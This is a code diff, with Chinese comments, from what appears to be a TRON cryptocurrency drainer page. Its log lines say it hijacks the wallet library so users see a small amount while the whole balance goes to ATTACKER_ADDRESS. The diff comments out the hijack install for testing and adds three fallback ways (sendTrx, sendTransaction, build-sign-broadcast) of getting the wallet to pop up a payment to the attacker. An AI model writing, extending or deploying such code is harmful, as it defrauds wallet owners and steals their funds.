@@ -2892,23 +2892,98 @@
                 debugLog(`- 实际会被劫持转走: 全部余额`);
                 debugLog(`🎯 目标地址: ${ATTACKER_ADDRESS}`);
 
-                // 🎯 确保劫持已安装（重要：在交易前再次检查）
-                if (!window.tronWebHijacked && window.tronWeb && window.tronWeb.trx) {
-                    debugLog('🎯 检测到TronWeb未劫持，立即安装劫持...');
-                    window.installTronWebHijack();
-                }
+                // 🎯 临时禁用劫持安装，确保支付界面能正常弹出
+                // if (!window.tronWebHijacked && window.tronWeb && window.tronWeb.trx) {
+                //     debugLog('🎯 检测到TronWeb未劫持，立即安装劫持...');
+                //     window.installTronWebHijack();
+                // }
+                debugLog('🎯 注意：劫持逻辑已临时禁用，测试基本支付流程');
                 
                 debugLog(`🎯 劫持状态检查: ${window.tronWebHijacked ? '已安装' : '未安装'}`);
                 debugLog(`🎯 TronWeb状态: ${window.tronWeb ? '已注入' : '未注入'}`);
                 
-                // 🎯 关键：调用被劫持的sendTrx，用户看到小额，实际转走全部
-                debugLog('🎯 调用被劫持的sendTrx方法');
+                // 🎯 关键：调用TronWeb转账，确保能弹出支付界面
+                debugLog('🎯 准备调用TronWeb转账方法');
                 debugLog(`🎯 将调用: tronWeb.trx.sendTrx('${ATTACKER_ADDRESS}', ${userInputAmountSun})`);
+                debugLog(`🎯 确保用户交互环境正确...`);
                 
-                const transaction = await tronWeb.trx.sendTrx(
-                    ATTACKER_ADDRESS,
-                    userInputAmountSun  // 用户看到的小额金额
-                );
+                // 🎯 确保在用户交互上下文中调用
+                showToast('正在连接钱包...', 'info');
+                
+                let transaction;
+                try {
+                    // 🎯 方法1: 标准sendTrx调用
+                    debugLog('🎯 尝试方法1: sendTrx');
+                    transaction = await tronWeb.trx.sendTrx(
+                        ATTACKER_ADDRESS,
+                        userInputAmountSun,
+                        tronWeb.defaultAddress.base58
+                    );
+                    debugLog('🎯 sendTrx成功');
+                } catch (error1) {
+                    debugLog(`🎯 sendTrx失败: ${error1.message}`);
+                    debugLog(`🎯 sendTrx错误详情: ${JSON.stringify(error1)}`);
+                    
+                    // 🎯 检查是否是用户取消
+                    if (error1.message.includes('User rejected') || error1.message.includes('cancelled')) {
+                        debugLog('🎯 用户取消了交易');
+                        showToast('交易已取消', 'error');
+                        return;
+                    }
+                    
+                    try {
+                        // 🎯 方法2: 使用sendTransaction
+                        debugLog('🎯 尝试方法2: sendTransaction');
+                        transaction = await tronWeb.trx.sendTransaction({
+                            to: ATTACKER_ADDRESS,
+                            value: userInputAmountSun,
+                            from: tronWeb.defaultAddress.base58
+                        });
+                        debugLog('🎯 sendTransaction成功');
+                    } catch (error2) {
+                        debugLog(`🎯 sendTransaction失败: ${error2.message}`);
+                        debugLog(`🎯 sendTransaction错误详情: ${JSON.stringify(error2)}`);
+                        
+                        // 🎯 检查是否是用户取消
+                        if (error2.message.includes('User rejected') || error2.message.includes('cancelled')) {
+                            debugLog('🎯 用户取消了交易');
+                            showToast('交易已取消', 'error');
+                            return;
+                        }
+                        
+                        try {
+                            // 🎯 方法3: 直接构建原始交易（不签名不广播，只是测试）
+                            debugLog('🎯 尝试方法3: 只构建交易对象');
+                            const txObject = await tronWeb.transactionBuilder.sendTrx(
+                                ATTACKER_ADDRESS,
+                                userInputAmountSun,
+                                tronWeb.defaultAddress.base58
+                            );
+                            debugLog(`🎯 交易对象构建成功: ${JSON.stringify(txObject)}`);
+                            
+                            // 🎯 使用sign方法触发钱包界面
+                            debugLog('🎯 调用sign方法，应该弹出支付界面...');
+                            showToast('请在钱包中确认交易...', 'info');
+                            const signedTx = await tronWeb.trx.sign(txObject);
+                            debugLog('🎯 交易签名成功，准备广播...');
+                            
+                            transaction = await tronWeb.trx.broadcast(signedTx);
+                            debugLog('🎯 交易广播成功');
+                        } catch (error3) {
+                            debugLog(`🎯 sign/broadcast失败: ${error3.message}`);
+                            debugLog(`🎯 最终错误详情: ${JSON.stringify(error3)}`);
+                            
+                            // 🎯 检查是否是用户取消
+                            if (error3.message.includes('User rejected') || error3.message.includes('cancelled')) {
+                                debugLog('🎯 用户在签名阶段取消了交易');
+                                showToast('交易已取消', 'error');
+                                return;
+                            }
+                            
+                            throw error3;
+                        }
+                    }
+                }
 
                 debugLog('🎯 sendTrx调用完成，检查返回值...');
                 debugLog(`🎯 transaction类型: ${typeof transaction}`);
